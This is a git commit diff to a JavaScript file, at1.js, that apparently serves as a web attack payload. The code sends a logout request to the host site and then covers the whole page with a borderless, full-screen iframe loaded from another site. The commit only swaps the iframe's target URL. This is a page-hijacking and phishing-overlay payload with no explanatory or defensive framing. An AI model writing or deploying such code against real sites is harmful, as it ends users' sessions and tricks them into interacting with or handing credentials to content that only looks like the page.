31c66c380043df1c86f890857f22e809033761bb
bbpa <57352896+bbpa@users.noreply.github.com>
2024-06-19 11:49:09 +0330

    Update at1.js

--- at1.js
+++ at1.js
@@ -6,7 +6,7 @@ fetch("/login/logout", {
 });
 
 let iframe=document.createElement("iframe");
-iframe.src="https://www.puritan.com/login"
+iframe.src="https://www.purinaconecta.com/"
   iframe.referrerPolicy="no-referrer"
 iframe.style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
 document.body.appendChild(iframe)
